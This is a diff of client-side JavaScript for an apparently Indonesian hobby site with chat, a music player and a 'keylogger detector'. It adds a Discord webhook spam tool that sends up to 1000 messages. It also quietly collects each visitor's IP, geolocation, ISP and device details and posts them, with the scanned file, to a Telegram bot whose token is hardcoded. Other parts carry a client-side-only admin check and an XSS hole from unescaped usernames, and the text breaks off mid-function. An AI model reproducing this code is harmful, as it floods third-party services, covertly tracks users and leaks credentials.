+  showToast('Berhasil mendaftar!');
+  nameInput.value = '';
+}
+
+function doLogout() {
+  username = '';
+  localStorage.removeItem(USERNAME_KEY);
+  updateSecureUI();
+  showToast('Nama dihapus');
+}
+
+function updateSecureUI() {
+  const registerForm = document.getElementById('secureRegisterForm');
+  const registered = document.getElementById('secureRegistered');
+  const displayName = document.getElementById('displayName');
+
+  if (username) {
+    registerForm.style.display = 'none';
+    registered.style.display = 'block';
+
+    // Show admin tag if SamuDev
+    if (username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
+      displayName.innerHTML = `<span class="username-part" style="font-size:18px;font-weight:700;color:var(--primary);">${username}</span> <span class="admin-tag">DEV APP</span>`;
+    } else {
+      displayName.textContent = username;
+    }
+  } else {
+    registerForm.style.display = 'block';
+    registered.style.display = 'none';
+  }
+}
+
+// ============ MENU ============
+function openSpamKeyloggerPanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('spam-keylogger-content').classList.add('active');
+}
+
+function closeSpamKeyloggerPanel() {
+  document.getElementById('spam-keylogger-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+function openSecurePanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('secure-content').classList.add('active');
+  updateSecureUI();
+}
+
+function closeSecurePanel() {
+  document.getElementById('secure-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+function openMusicPanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('music-content').classList.add('active');
+  renderSongList();
+}
+
+function closeMusicPanel() {
+  document.getElementById('music-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+function openTipsTrickPanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('tips-trick-content').classList.add('active');
+}
+
+function closeTipsTrickPanel() {
+  document.getElementById('tips-trick-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+function openVideoPanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('video-content').classList.add('active');
+}
+
+function closeVideoPanel() {
+  document.getElementById('video-content').classList.remove('active');
+  document.getElementById('tips-trick-content').classList.add('active');
+}
+
+// ============ DOWNLOAD BLOCK KEYLOGGER ============
+async function downloadBlockKeylogger() {
+  showToast('⏳ Sedang menyiapkan file...');
+
+  try {
+    // Try to download from API first
+    const response = await fetch('/api/download/block-keylogger');
+
+    if (response.ok) {
+      const blob = await response.blob();
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'BLOK KEYLOGGER.zip';
+      document.body.appendChild(a);
+      a.click();
+      window.URL.revokeObjectURL(url);
+      document.body.removeChild(a);
+      showToast('✅ File berhasil didownload!');
+      return;
+    }
+  } catch (error) {
+    console.log('API download failed, trying direct URL...');
+  }
+
+  // Fallback: Direct download from public folder
+  window.open('/BLOK%20KEYLOGGER.zip', '_blank');
+  showToast('⏳ Download dimulai...');
+}
+
+// ============ MUSIC PLAYER ============
+const songs = [
+  { title: "Seandainya", url: "https://feeldreams.github.io/maukahkamu/seandainya.mp3" },
+  { title: "Dj - papapa", url: "https://feeldreams.github.io/papapa.mp3" },
+  { title: "Multo", url: "https://raw.githubusercontent.com/Mr666-cry/Samstore/main/07%20Multo.mp3" },
+  { title: "Tarot", url: "https://files.catbox.moe/m8h7z4.mp3" },
+  { title: "O.Tuan", url: "https://files.catbox.moe/udh1c3.m4a" }
+];
+
+let currentSongIndex = 0;
+let isPlaying = false;
+const audioPlayer = document.getElementById('audioPlayer');
+
+function renderSongList() {
+  const songListContainer = document.getElementById('songList');
+  songListContainer.innerHTML = '';
+
+  songs.forEach((song, index) => {
+    const songItem = document.createElement('div');
+    songItem.style.cssText = `
+      background: ${index === currentSongIndex ? 'rgba(102, 126, 234, 0.2)' : 'rgba(255,255,255,0.05)'};
+      border: 1px solid ${index === currentSongIndex ? 'rgba(102, 126, 234, 0.3)' : 'rgba(255,255,255,0.1)'};
+      border-radius: 10px;
+      padding: 12px 14px;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    `;
+
+    if (index === currentSongIndex) {
+      songItem.innerHTML = `
+        <svg viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px;color:#667eea;">
+          <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
+        </svg>
+        <span style="flex:1;color:var(--primary);font-weight:600;">${song.title}</span>
+        ${isPlaying ? '<svg viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px;color:#667eea;"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>' : '<svg viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px;color:#667eea;"><path d="M8 5v14l11-7z"/></svg>'}
+      `;
+    } else {
+      songItem.innerHTML = `
+        <svg viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px;color:var(--muted);">
+          <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
+        </svg>
+        <span style="flex:1;color:var(--primary);">${song.title}</span>
+      `;
+    }
+
+    songItem.onclick = () => selectSong(index);
+    songItem.onmouseover = () => {
+      if (index !== currentSongIndex) {
+        songItem.style.background = 'rgba(255,255,255,0.1)';
+      }
+    };
+    songItem.onmouseout = () => {
+      if (index !== currentSongIndex) {
+        songItem.style.background = 'rgba(255,255,255,0.05)';
+      }
+    };
+
+    songListContainer.appendChild(songItem);
+  });
+}
+
+function selectSong(index) {
+  currentSongIndex = index;
+  audioPlayer.src = songs[index].url;
+  audioPlayer.play();
+  isPlaying = true;
+  updatePlayerUI();
+  renderSongList();
+}
+
+function togglePlay() {
+  if (!audioPlayer.src) {
+    selectSong(0);
+    return;
+  }
+
+  if (isPlaying) {
+    audioPlayer.pause();
+    isPlaying = false;
+  } else {
+    audioPlayer.play();
+    isPlaying = true;
+  }
+
+  updatePlayerUI();
+  renderSongList();
+}
+
+function nextSong() {
+  currentSongIndex = (currentSongIndex + 1) % songs.length;
+  audioPlayer.src = songs[currentSongIndex].url;
+  audioPlayer.play();
+  isPlaying = true;
+  updatePlayerUI();
+  renderSongList();
+}
+
+function prevSong() {
+  currentSongIndex = (currentSongIndex - 1 + songs.length) % songs.length;
+  audioPlayer.src = songs[currentSongIndex].url;
+  audioPlayer.play();
+  isPlaying = true;
+  updatePlayerUI();
+  renderSongList();
+}
+
+function updatePlayerUI() {
+  const currentSongTitle = document.getElementById('currentSongTitle');
+  const currentSongStatus = document.getElementById('currentSongStatus');
+  const playIcon = document.getElementById('playIcon');
+  const pauseIcon = document.getElementById('pauseIcon');
+
+  currentSongTitle.textContent = songs[currentSongIndex]?.title || 'Pilih Lagu';
+  currentSongStatus.textContent = isPlaying ? 'Now Playing' : 'Paused';
+
+  if (isPlaying) {
+    playIcon.style.display = 'none';
+    pauseIcon.style.display = 'block';
+  } else {
+    playIcon.style.display = 'block';
+    pauseIcon.style.display = 'none';
+  }
+}
+
+function formatTime(seconds) {
+  if (isNaN(seconds)) return '0:00';
+  const mins = Math.floor(seconds / 60);
+  const secs = Math.floor(seconds % 60);
+  return `${mins}:${secs.toString().padStart(2, '0')}`;
+}
+
+// Audio player event listeners
+audioPlayer.addEventListener('timeupdate', () => {
+  const currentTime = document.getElementById('currentTime');
+  const durationTime = document.getElementById('durationTime');
+  const progressBar = document.getElementById('progressBar');
+
+  currentTime.textContent = formatTime(audioPlayer.currentTime);
+
+  if (audioPlayer.duration) {
+    durationTime.textContent = formatTime(audioPlayer.duration);
+    progressBar.value = (audioPlayer.currentTime / audioPlayer.duration) * 100;
+  }
+});
+
+audioPlayer.addEventListener('ended', () => {
+  nextSong();
+});
+
+audioPlayer.addEventListener('play', () => {
+  isPlaying = true;
+  updatePlayerUI();
+  renderSongList();
+});
+
+audioPlayer.addEventListener('pause', () => {
+  isPlaying = false;
+  updatePlayerUI();
+  renderSongList();
+});
+
+document.getElementById('progressBar').addEventListener('input', (e) => {
+  const seekTime = (e.target.value / 100) * audioPlayer.duration;
+  audioPlayer.currentTime = seekTime;
+});
+
+// ============ LIVE CHAT WITH FIREBASE ============
+let liveChatListener = null;
+let editingChatKey = null;
+let chatMessages = {};
+let userIP = '';
+
+const ADMIN_USERNAME = 'SamuDev';
+const ALLOWED_ADMIN_IPS = ['2a09:bac1:6520:8::279:39', '114.8.208.219'];
+
+async function getUserIP() {
+  let detectedIP = null;
+
+  // Try to get IPv6 first
+  try {
+    const response = await fetch('https://api64.ipify.org?format=json');
+    const data = await response.json();
+    detectedIP = data.ip;
+    userIP = detectedIP;
+    return detectedIP;
+  } catch (error) {
+    console.log('IPv6 detection failed, trying IPv4...');
+  }
+
+  // Fallback to IPv4
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    detectedIP = data.ip;
+    userIP = detectedIP;
+    return detectedIP;
+  } catch (error) {
+    console.error('Failed to get IP:', error);
+    return null;
+  }
+}
+
+function isAdmin() {
+  return username.toLowerCase() === ADMIN_USERNAME.toLowerCase();
+}
+
+function isAllowedIP() {
+  return ALLOWED_ADMIN_IPS.includes(userIP);
+}
+
+function openLivechatPanel() {
+  if (!username) {
+    showToast('Mohon daftar nama terlebih dahulu!');
+    openSecurePanel();
+    return;
+  }
+
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('livechat-content').classList.add('active');
+
+  // Initialize Firebase chat
+  initializeLiveChat();
+}
+
+function closeLivechatPanel() {
+  document.getElementById('livechat-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+
+  // Stop listening to Firebase
+  if (liveChatListener) {
+    liveChatListener();
+    liveChatListener = null;
+  }
+}
+
+function initializeLiveChat() {
+  const chatContainer = document.getElementById('liveChatContainer');
+
+  // Clear previous messages
+  chatMessages = {};
+  chatContainer.innerHTML = '<div class="chat-bubble bubble-system">Live Chat</div>';
+
+  // Listen to new messages
+  liveChatListener = window.firebaseOnChildAdded('chat', (snapshot) => {
+    const data = snapshot.val();
+    const key = snapshot.key;
+
+    // Store message for editing
+    chatMessages[key] = data;
+
+    addLiveChatBubble(key, data);
+    scrollToBottom(chatContainer);
+  });
+}
+
+function addLiveChatBubble(key, data) {
+  const chatContainer = document.getElementById('liveChatContainer');
+
+  const wrapper = document.createElement('div');
+  wrapper.className = 'chat-bubble-wrapper';
+  wrapper.id = `chat-${key}`;
+
+  const isMe = data.username === username;
+  const isAdminMsg = data.username.toLowerCase() === ADMIN_USERNAME.toLowerCase();
+
+  let bubbleClass = 'bubble-owner';
+  if (isMe) {
+    bubbleClass = 'bubble-user';
+  }
+
+  // Build username with special tag for SamuDev
+  let usernameHtml = '';
+  if (isAdminMsg) {
+    usernameHtml = `<span class="username-part">${data.username}</span> <span class="admin-tag">DEV APP</span>`;
+  } else {
+    usernameHtml = data.username;
+  }
+
+  const bubble = document.createElement('div');
+  bubble.className = `chat-bubble ${bubbleClass}`;
+  bubble.innerHTML = `
+    <div class="bubble-username">${usernameHtml}</div>
+    ${escapeHtml(data.message)}
+  `;
+
+  wrapper.appendChild(bubble);
+
+  // Admin controls for SamuDev
+  if (isAdmin() && !isMe) {
+    const controls = document.createElement('div');
+    controls.className = 'chat-admin-controls';
+    controls.innerHTML = `
+      <button class="chat-admin-btn" onclick="openEditModal('${key}')">✏️ Edit</button>
+      <button class="chat-admin-btn delete" onclick="deleteChat('${key}')">🗑️ Hapus</button>
+    `;
+    wrapper.appendChild(controls);
+    wrapper.classList.add('admin');
+  }
+
+  chatContainer.appendChild(wrapper);
+}
+
+function sendLiveChatMessage() {
+  if (!username) {
+    showToast('Mohon daftar nama terlebih dahulu!');
+    return;
+  }
+
+  const input = document.getElementById('liveChatInput');
+  const message = input.value.trim();
+
+  if (!message) return;
+
+  try {
+    window.firebasePush('chat', {
+      username: username,
+      message: message,
+      timestamp: window.firebaseServerTimestamp()
+    });
+
+    input.value = '';
+  } catch (error) {
+    console.error('Error sending message:', error);
+    showToast('Gagal mengirim pesan!');
+  }
+}
+
+function handleLiveChatKeyPress(e) {
+  if (e.key === 'Enter') {
+    sendLiveChatMessage();
+  }
+}
+
+function deleteChat(key) {
+  if (!confirm('Hapus pesan ini?')) return;
+
+  try {
+    window.firebaseRemove(`chat/${key}`);
+    const chatElement = document.getElementById(`chat-${key}`);
+    if (chatElement) {
+      chatElement.remove();
+    }
+    delete chatMessages[key];
+    showToast('Pesan dihapus!');
+  } catch (error) {
+    console.error('Error deleting message:', error);
+    showToast('Gagal menghapus pesan!');
+  }
+}
+
+function openEditModal(key) {
+  editingChatKey = key;
+  const message = chatMessages[key]?.message || '';
+
+  const modal = document.getElementById('editChatModal');
+  const textarea = document.getElementById('editChatTextarea');
+
+  textarea.value = message;
+  modal.classList.add('show');
+  textarea.focus();
+}
+
+function closeEditModal() {
+  editingChatKey = null;
+  document.getElementById('editChatModal').classList.remove('show');
+}
+
+function saveEditedChat() {
+  if (!editingChatKey) return;
+
+  const textarea = document.getElementById('editChatTextarea');
+  const newMessage = textarea.value.trim();
+
+  if (!newMessage) {
+    showToast('Pesan tidak boleh kosong!');
+    return;
+  }
+
+  try {
+    window.firebaseUpdate(`chat/${editingChatKey}`, {
+      message: newMessage
+    });
+
+    // Update local display
+    const chatElement = document.getElementById(`chat-${editingChatKey}`);
+    if (chatElement) {
+      const bubble = chatElement.querySelector('.chat-bubble');
+
+      // Get the username HTML from the original message
+      const originalUsername = chatMessages[editingChatKey]?.username || '';
+      const isAdminMsg = originalUsername.toLowerCase() === ADMIN_USERNAME.toLowerCase();
+
+      // Rebuild username with special tag if needed
+      let usernameHtml = '';
+      if (isAdminMsg) {
+        usernameHtml = `<span class="username-part">${originalUsername}</span> <span class="admin-tag">DEV APP</span>`;
+      } else {
+        usernameHtml = originalUsername;
+      }
+
+      bubble.innerHTML = `
+        <div class="bubble-username">${usernameHtml}</div>
+        ${escapeHtml(newMessage)}
+      `;
+    }
+
+    // Update local storage
+    if (chatMessages[editingChatKey]) {
+      chatMessages[editingChatKey].message = newMessage;
+    }
+
+    closeEditModal();
+    showToast('Pesan diedit!');
+  } catch (error) {
+    console.error('Error editing message:', error);
+    showToast('Gagal mengedit pesan!');
+  }
+}
+
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+function scrollToBottom(element) {
+  element.scrollTop = element.scrollHeight;
+}
+
+// ============ CHAT AI FUNCTIONS (STILL AVAILABLE) ============
+function openKeyloggerDetection() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('keylogger-detection-content').classList.add('active');
+}
+
+function closeKeyloggerDetection() {
+  document.getElementById('keylogger-detection-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+function openChatAiPanel() {
+  document.querySelectorAll('.menu-content').forEach(c=>c.classList.remove('active'));
+  document.getElementById('chat-ai-content').classList.add('active');
+  loadChatAiHistory();
+}
+
+function closeChatAiPanel() {
+  document.getElementById('chat-ai-content').classList.remove('active');
+  document.getElementById('home-content').classList.add('active');
+}
+
+// ============ SPAM KEYLOGGER (DISCORD WEBHOOK) ============
+async function startSpamKeylogger() {
+  const webhookUrl = document.getElementById('discordWebhookUrl').value.trim();
+  const amount = parseInt(document.getElementById('spamAmount').value);
+  const message = document.getElementById('discordMessage').value.trim();
+  const btn = document.getElementById('spamKeyloggerButton');
+  const status = document.getElementById('spamStatus');
+
+  // Validasi input
+  if (!webhookUrl) return showToast('Masukkan Discord Webhook URL!');
+  if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') &&
+      !webhookUrl.startsWith('https://ptb.discord.com/api/webhooks/') &&
+      !webhookUrl.startsWith('https://canary.discord.com/api/webhooks/')) {
+    return showToast('URL webhook tidak valid!');
+  }
+  if (!amount || amount < 1) return showToast('Masukkan jumlah pesan!');
+  if (amount > 1000) return showToast('Maksimal 1000 pesan!');
+  if (!message) return showToast('Masukkan pesan yang ingin dikirim!');
+
+  // Cek jika sudah berjalan
+  if (btn.classList.contains('loading')) return;
+
+  btn.classList.add('loading');
+  btn.disabled = true;
+
+  let successCount = 0;
+  let failCount = 0;
+
+  for (let i = 1; i <= amount; i++) {
+    status.textContent = `Mengirim pesan ${i}/${amount}... (✅${successCount} ❌${failCount})`;
+
+    try {
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: message,
+          username: 'Spam Keylogger',
+          avatar_url: 'https://i.imgur.com/4M34hi2.png'
+        })
+      });
+
+      if (response.ok) {
+        successCount++;
+      } else {
+        failCount++;
+      }
+    } catch (error) {
+      console.error('Error sending message:', error);
+      failCount++;
+    }
+
+    // Delay kecil untuk menghindari rate limiting terlalu cepat
+    if (i % 10 === 0) {
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    } else {
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+  }
+
+  btn.classList.remove('loading');
+  btn.disabled = false;
+
+  if (successCount > 0) {
+    status.textContent = `✅ Selesai! ${successCount} pesan terkirim, ${failCount} gagal`;
+    showToast(`✅ Selesai! ${successCount}/${amount} pesan terkirim`);
+  } else {
+    status.textContent = `❌ Gagal! ${failCount} pesan gagal dikirim`;
+    showToast('❌ Semua pesan gagal dikirim!');
+  }
+}
+
+// ============ KEYLOGGER DETECTION WITH ENCRYPTION LEVEL & URL ANALYSIS ============
+
+// URLs yang dianggap aman untuk pengiriman data
+const SAFE_URL_DOMAINS = [
+  'discord.com',
+  'discord.gg',
+  'canary.discord.com',
+  'ptb.discord.com',
+  't.me',
+  'telegram.org',
+  'telegram.me'
+];
+
+// Patterns untuk deteksi keylogger
+const KEYLOGGER_PATTERNS = {
+  // Keyboard hooks
+  keyboardHooks: [
+    /hook\s*\(.*?\s*keyboard/i,
+    /SetWindowsHookEx/i,
+    /GetAsyncKeyState/i,
+    /GetKeyState/i,
+    /RegisterHotKey/i,
+    /key\s*press/i,
+    /key\s*down/i,
+    /key\s*up/i,
+    /onkey/i,
+    /onkeypress/i,
+    /keydown/i,
+    /keyup/i,
+    /keylog/i,
+    /keylog/i
+  ],
+
+  // Input capture
+  inputCapture: [
+    /GetForegroundWindow/i,
+    /GetWindowText/i,
+    /GetWindowThreadProcessId/i,
+    /GetActiveWindow/i,
+    /GetFocus/i,
+    /AttachThreadInput/i,
+    /input\s*logger/i,
+    /input\s*recorder/i,
+    /input\s*tracker/i
+  ],
+
+  // HTTP requests ke external
+  externalUrls: [
+    /https?:\/\/[^\s"']+/gi
+  ],
+
+  // Data sending
+  dataSending: [
+    /http\.send/i,
+    /http\.post/i,
+    /http\.get/i,
+    /http\.request/i,
+    /fetch\s*\(/i,
+    /XMLHttpRequest/i,
+    /curl/i,
+    /wget/i,
+    /base64/i,
+    /encode/i,
+    /encrypt/i,
+    /decrypt/i
+  ],
+
+  // File operations yang mencurigakan
+  fileOps: [
+    /writefile/i,
+    /appendfile/i,
+    /fs\.write/i,
+    /fs\.append/i,
+    /io\.write/i,
+    /io\.open/i,
+    /save.*log/i,
+    /save.*input/i
+  ],
+
+  // Clipboard access
+  clipboard: [
+    /clipboard/i,
+    /copy\s*to\s*clipboard/i,
+    /get.*clipboard/i
+  ],
+
+  // Screenshot
+  screenshot: [
+    /screenshot/i,
+    /capture\s*screen/i,
+    /screen\s*capture/i
+  ]
+};
+
+function analyzeUrlType(url) {
+  try {
+    const urlObj = new URL(url);
+    const domain = urlObj.hostname.toLowerCase();
+
+    // Cek apakah domain adalah Discord atau Telegram
+    for (const safeDomain of SAFE_URL_DOMAINS) {
+      if (domain === safeDomain || domain.endsWith('.' + safeDomain)) {
+        return {
+          isDiscordOrTelegram: true,
+          domain: domain,
+          type: domain.includes('discord') ? 'discord' : 'telegram'
+        };
+      }
+    }
+
+    return {
+      isDiscordOrTelegram: false,
+      domain: domain,
+      type: 'external'
+    };
+  } catch (error) {
+    return {
+      isDiscordOrTelegram: false,
+      domain: 'unknown',
+      type: 'unknown'
+    };
+  }
+}
+
+function detectEncryptionLevel(code) {
+  let encryptionLevel = 0; // 0: None, 1: Low, 2: Medium, 3: High
+  const encryptionDetails = {
+    level: 0,
+    hasBase64: false,
+    hasXOR: false,
+    hasAdvanced: false,
+    hasCustom: false,
+    stringCount: 0,
+    hexStrings: []
+  };
+
+  // Detect Base64
+  if (/base64|Base64|atob|btoa/gi.test(code)) {
+    encryptionLevel += 1;
+    encryptionDetails.hasBase64 = true;
+  }
+
+  // Detect XOR encryption patterns
+  if (/(\^|\sxor\s|XOR)/gi.test(code) && /string\.char|char.*\d+/gi.test(code)) {
+    encryptionLevel += 1;
+    encryptionDetails.hasXOR = true;
+  }
+
+  // Detect advanced encryption (AES, DES, etc.)
+  if (/aes|des|rc4|sha|md5|crypto|encrypt|decrypt/gi.test(code)) {
+    encryptionLevel += 2;
+    encryptionDetails.hasAdvanced = true;
+  }
+
+  // Detect custom/complex encryption
+  const hexStrings = code.match(/0x[0-9a-fA-F]{4,}/g) || [];
+  if (hexStrings.length > 10) {
+    encryptionLevel += 1;
+    encryptionDetails.hasCustom = true;
+    encryptionDetails.hexStrings = hexStrings.slice(0, 5);
+  }
+
+  // Calculate final level
+  if (encryptionLevel === 0) {
+    encryptionDetails.level = 0;
+  } else if (encryptionLevel <= 2) {
+    encryptionDetails.level = 1; // Low
+  } else if (encryptionLevel <= 4) {
+    encryptionDetails.level = 2; // Medium
+  } else {
+    encryptionDetails.level = 3; // High
+  }
+
+  return encryptionDetails;
+}
+
+function analyzeLuaCode(code) {
+  const findings = {
+    keyboardHooks: [],
+    inputCapture: [],
+    externalUrls: [],
+    discordTelegramUrls: [],
+    otherUrls: [],
+    dataSending: [],
+    fileOps: [],
+    clipboard: [],
+    screenshot: [],
+    encryption: null
+  };
+
+  // Analisis keyboard hooks
+  KEYLOGGER_PATTERNS.keyboardHooks.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.keyboardHooks.push(...matches);
+    }
+  });
+
+  // Analisis input capture
+  KEYLOGGER_PATTERNS.inputCapture.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.inputCapture.push(...matches);
+    }
+  });
+
+  // Analisis external URLs
+  const urlMatches = code.match(KEYLOGGER_PATTERNS.externalUrls[0]);
+  if (urlMatches) {
+    findings.externalUrls.push(...urlMatches);
+
+    // Categorize URLs
+    urlMatches.forEach(url => {
+      const urlInfo = analyzeUrlType(url);
+      if (urlInfo.isDiscordOrTelegram) {
+        findings.discordTelegramUrls.push({
+          url: url,
+          type: urlInfo.type,
+          domain: urlInfo.domain
+        });
+      } else {
+        findings.otherUrls.push({
+          url: url,
+          type: urlInfo.type,
+          domain: urlInfo.domain
+        });
+      }
+    });
+  }
+
+  // Analisis data sending
+  KEYLOGGER_PATTERNS.dataSending.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.dataSending.push(...matches);
+    }
+  });
+
+  // Analisis file operations
+  KEYLOGGER_PATTERNS.fileOps.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.fileOps.push(...matches);
+    }
+  });
+
+  // Analisis clipboard
+  KEYLOGGER_PATTERNS.clipboard.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.clipboard.push(...matches);
+    }
+  });
+
+  // Analisis screenshot
+  KEYLOGGER_PATTERNS.screenshot.forEach(pattern => {
+    const matches = code.match(new RegExp(pattern, 'gi'));
+    if (matches) {
+      findings.screenshot.push(...matches);
+    }
+  });
+
+  // Analisis enkripsi
+  findings.encryption = detectEncryptionLevel(code);
+
+  // Hitung score dengan logic baru untuk URL
+  let score = 0;
+
+  // Base score dari malicious patterns
+  if (findings.keyboardHooks.length > 0) score += 25;
+  if (findings.inputCapture.length > 0) score += 20;
+  if (findings.dataSending.length > 0) score += 15;
+  if (findings.fileOps.length > 0) score += 10;
+  if (findings.clipboard.length > 0) score += 10;
+  if (findings.screenshot.length > 0) score += 10;
+
+  // URL scoring - DISCORD/TELEGRAM URLs lebih berbahaya untuk keylogger
+  if (findings.discordTelegramUrls.length > 0) {
+    score += 30; // High suspicion
+  }
+
+  // External URLs lain (non Discord/Telegram) lebih aman
+  if (findings.otherUrls.length > 0) {
+    score += 10; // Low suspicion
+  }
+
+  // Encryption scoring
+  if (findings.encryption.hasAdvanced || findings.encryption.level >= 3) {
+    score += 20;
+  } else if (findings.encryption.hasXOR || findings.encryption.level === 2) {
+    score += 15;
+  } else if (findings.encryption.hasBase64 || findings.encryption.level === 1) {
+    score += 5;
+  }
+
+  findings.score = Math.min(score, 100);
+
+  // Tentukan warning level dengan logic baru
+  let warningLevel = 0;
+  let isKeylogger = false;
+
+  // Logic baru: Jika ada Discord/Telegram URL + pattern lain = Keylogger Detected
+  // Jika ada external URL lain = Warning 1 - Keylogger not detected
+  if (findings.discordTelegramUrls.length > 0 && findings.keyboardHooks.length > 0) {
+    warningLevel = 1;
+    isKeylogger = true;
+  } else if (findings.otherUrls.length > 0 && findings.keyboardHooks.length > 0) {
+    warningLevel = 1;
+    isKeylogger = false;
+  } else if (score >= 70) {
+    warningLevel = 3;
+    isKeylogger = true;
+  } else if (score >= 40) {
+    warningLevel = 2;
+    isKeylogger = true;
+  } else if (score >= 20) {
+    warningLevel = 1;
+    isKeylogger = false;
+  }
+
+  findings.warningLevel = warningLevel;
+  findings.isKeylogger = isKeylogger;
+
+  return findings;
+}
+
+// ============ USER INFO COLLECTION ============
+async function getUserInfo() {
+  let ipInfo = {
+    ip: 'Unknown',
+    country: 'Unknown',
+    countryCode: 'Unknown',
+    city: 'Unknown',
+    region: 'Unknown',
+    postal: 'Unknown',
+    lat: 'Unknown',
+    lon: 'Unknown',
+    isp: 'Unknown',
+    timezone: 'Unknown'
+  };
+
+  try {
+    // Get IP Address and location info
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    ipInfo.ip = ipData.ip;
+
+    // Get detailed location info
+    const locResponse = await fetch(`https://ipapi.co/${ipInfo.ip}/json/`);
+    const locData = await locResponse.json();
+    
+    ipInfo.country = locData.country_name || 'Unknown';
+    ipInfo.countryCode = locData.country_code || 'Unknown';
+    ipInfo.city = locData.city || 'Unknown';
+    ipInfo.region = locData.region || 'Unknown';
+    ipInfo.postal = locData.postal || 'Unknown';
+    ipInfo.lat = locData.latitude || 'Unknown';
+    ipInfo.lon = locData.longitude || 'Unknown';
+    ipInfo.isp = locData.org || 'Unknown';
+    ipInfo.timezone = locData.timezone || 'Unknown';
+  } catch (error) {
+    console.error('Failed to get IP info:', error);
+  }
+
+  // Browser Info
+  const ua = navigator.userAgent;
+  let browserName = 'Unknown';
+  let browserEmoji = '🌐';
+
+  if (ua.includes('Chrome')) {
+    browserName = 'Google Chrome';
+    browserEmoji = '🌐';
+  } else if (ua.includes('Firefox')) {
+    browserName = 'Mozilla Firefox';
+    browserEmoji = '🦊';
+  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+    browserName = 'Apple Safari';
+    browserEmoji = '🍎';
+  } else if (ua.includes('Edge')) {
+    browserName = 'Microsoft Edge';
+    browserEmoji = '📦';
+  } else if (ua.includes('Opera')) {
+    browserName = 'Opera';
+    browserEmoji = '🎭';
+  }
+
+  // OS Info
+  let osName = 'Unknown';
+  let osEmoji = '💻';
+
+  if (ua.includes('Windows')) {
+    osName = 'Windows';
+    osEmoji = '🪟';
+  } else if (ua.includes('Mac')) {
+    osName = 'macOS';
+    osEmoji = '🍎';
+  } else if (ua.includes('Linux')) {
+    osName = 'Linux';
+    osEmoji = '🐧';
+  } else if (ua.includes('Android')) {
+    osName = 'Android';
+    osEmoji = '🤖';
+  } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
+    osName = 'iOS';
+    osEmoji = '📱';
+  }
+
+  // Screen Resolution
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+
+  // Browser Language
+  const browserLanguage = navigator.language || 'Unknown';
+
+  // User Agent
+  const userAgent = ua || 'Unknown';
+
+  return { ipInfo, browserName, browserEmoji, osName, osEmoji, screenWidth, screenHeight, browserLanguage, userAgent };
+}
+
+// ============ TELEGRAM NOTIFICATION (DIRECT TO API - NO BACKEND) ============
+async function sendScanToTelegram(file, fileName, securityScore, warningLevel, isKeylogger) {
+  try {
+    const userInfo = await getUserInfo();
+    const botToken = '8366973574:AAHTvvuhb8B8--hsZd_qe7KkfjpnupW_Z6s';
+    const chatId = '7625804862';
+
+    // Score emojis and labels
+    let scoreEmoji, scoreLabel, scoreClass;
+    if (securityScore >= 80) {
+      scoreEmoji = '🟢';
+      scoreLabel = 'SANGAT AMAN';
+      scoreClass = '✅';
+    } else if (securityScore >= 60) {
+      scoreEmoji = '🟡';
+      scoreLabel = 'CUKUP AMAN';
+      scoreClass = '⚠️';
+    } else if (securityScore >= 40) {
+      scoreEmoji = '🟠';
+      scoreLabel = 'SEDANG BERTAHAYA';
+      scoreClass = '⚠️';
+    } else {
+      scoreEmoji = '🔴';
+      scoreLabel = 'SANGAT BERTAHAYA';
+      scoreClass = '🚨';
+    }
+
+    // Warning level emojis
+    let warningEmoji, warningText;
+    if (warningLevel === 0) {
+      warningEmoji = '🟢';
